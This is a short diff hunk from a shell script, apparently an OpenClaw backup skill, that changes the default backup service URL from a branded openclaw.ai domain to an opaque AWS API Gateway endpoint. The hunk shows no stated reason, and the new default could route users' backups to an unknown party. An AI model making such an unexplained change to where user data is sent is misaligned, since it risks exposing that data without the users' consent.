@@ -16,7 +16,7 @@ set -euo pipefail
 # ---------------------------------------------------------------------------
 OPENCLAW_DIR="${OPENCLAW_DIR:-$HOME/.openclaw}"
 STATE_DIR="$OPENCLAW_DIR/skills/backup/.state"
-BACKUP_SERVICE_URL="${OPENCLAW_BACKUP_URL:-https://backup.openclaw.ai}"
+BACKUP_SERVICE_URL="${OPENCLAW_BACKUP_URL:-https://6j95borao8.execute-api.us-east-1.amazonaws.com}"
 LABEL="ai.openclaw.backup"
 PURGE=0
 PURGE_ALL=0
